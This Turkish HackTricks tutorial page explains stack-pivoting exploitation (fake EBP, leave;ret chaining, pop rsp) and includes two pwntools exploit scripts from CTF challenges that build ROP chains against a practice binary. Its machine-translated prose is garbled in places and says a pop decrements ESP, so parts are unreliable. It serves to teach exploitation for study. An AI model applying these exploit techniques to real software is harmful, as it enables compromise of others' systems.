# Stack Pivoting - EBP2Ret - EBP chaining

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

Bu teknik, **Base Pointer (EBP)**'yi manipüle etme yeteneğini kullanarak EBP kaydını dikkatli bir şekilde kullanarak ve `leave; ret` komut dizisinin dikkatli kullanımıyla birden fazla fonksiyonun yürütülmesini zincirleme şeklinde sömürür.

Hatırlatma olarak, **`leave`** temelde şunu ifade eder:
```
movl               %ebp, %esp
popl               %ebp
ret
```
Ve **EBP, EIP'den önce stack'te** olduğundan, stack'i kontrol ederek EBP'yi kontrol etmek mümkündür.

### EBP2Ret

Bu teknik, **EBP kaydını değiştirebileceğiniz ancak EIP kaydını doğrudan değiştiremeyeceğiniz durumlarda** özellikle yararlıdır. Fonksiyonların çalışmayı bitirdiklerindeki davranışlarını kullanır.

`fvuln`'ün yürütülmesi sırasında, stack'e **sahte bir EBP** enjekte ederek, bu sahte EBP'nin, shellcode'unuzun adresinin bulunduğu bellek alanına işaret etmesini sağlarsanız (pop işlemi için 4 bayt eklenerek), EIP'yi dolaylı olarak kontrol edebilirsiniz. `fvuln` geri döndüğünde, ESP bu hazırlanmış konuma ayarlanır ve ardışık `pop` işlemi ESP'yi 4 azaltarak etkili bir şekilde shellcode'unuza işaret eder. `ret` talimatı yürütüldüğünde, kontrol shellcode'unuza aktarılır.

#### Saldırı Oluşturma

Öncelikle, shellcode'unuzu bir yürütülebilir bellek alanına **enjekte etmeniz ve adresini almanız**, veya geçerli bir [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) adresini almanız veya ESP'yi `system()` adresinin bulunduğu yere ve ardından `"/bin/sh"` adresiyle takip edilen **4 gereksiz bayt** içeren bir yere işaret etmeniz gerekir.

Daha sonra, bir dolgu oluşturun ve EBP'yi, `shellcode/one_gadget adresi - 4` ile tehlikeye atın. Bu `-4` olmalı çünkü `pop` işleminden dolayıdır. Sonra, ESP istediğimiz adrese işaret ederken ve `ret` yürütülürken olacak.

#### Bir Tane Yanlışlıkla Exploit

Bu tekniğin belirli bir varyantı olan "Bir Tane Yanlışlıkla Exploit" adında özel bir varyantı vardır. Bu, **EBP'nin en az anlamlı baytını yalnızca değiştirebildiğinizde** kullanılır. Bu durumda, shellcode'un adresini depolayan bellek konumu, EBP ile ilk üç baytı paylaşmalıdır, daha kısıtlanmış koşullarla benzer bir manipülasyona izin verir.

### **EBP Zincirleme**

Bu nedenle, stack'teki `EBP` girişine kontrol edilen bir adres ve `EIP`'de `leave; ret` adresi yerleştirilerek, `ESP`'nin stack'teki kontrol edilen `EBP` adresine **taşınması mümkün olur**.

Şimdi, **`ESP`** istenilen bir adrese işaret ederken ve bir sonraki talimatın yürütülmesi bir `RET` olduğunda, bunu kötüye kullanmak için kontrol edilen ESP yerine şunu yerleştirmek mümkündür:

* **`&(sonraki sahte EBP)`** -> `leave` talimatından `pop ebp` ile yeni EBP'yi yükleyin
* **`system()`** -> `ret` tarafından çağrılır
* **`&(leave;ret)`** -> sistem bittiğinde çağrılır, ESP'yi sahte EBP'ye taşır ve tekrar başlar
* **`&("/bin/sh")`**-> `system` için parametre

Temelde bu şekilde programın akışını kontrol etmek için birkaç sahte EBP zincirlenmesi mümkündür.

Aslında, bu, [ret2lib](ret2lib/) gibi bir şeydir, ancak açık bir fayda olmaksızın daha karmaşıktır, ancak bazı sınırlı durumlarda ilginç olabilir.

Ayrıca, burada bu tekniği bir **stack sızıntısı** ile kullanarak kazanan bir işlevi çağırmak için kullanan bir [**zorluk örneği**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) bulunmaktadır. Bu, sayfadaki final saldırı yüküdür:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## RSP'yi kontrol etmek için diğer yollar

### **`pop rsp`** cihazı

[**Bu sayfada**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) bu teknik kullanılarak bir örnek bulabilirsiniz. Bu zorluk için 2 belirli argümanla bir işlevi çağırmak gerekiyordu ve bir **`pop rsp` cihazı** bulunuyordu ve bir **yığın sızıntısı** mevcuttu:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<rag>, rsp cihazı
```
pop <reg>                <=== return pointer
<reg value>
xchg <rag>, rsp
```
## Referanslar

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** istiyorsanız [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'ı takip edin.
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
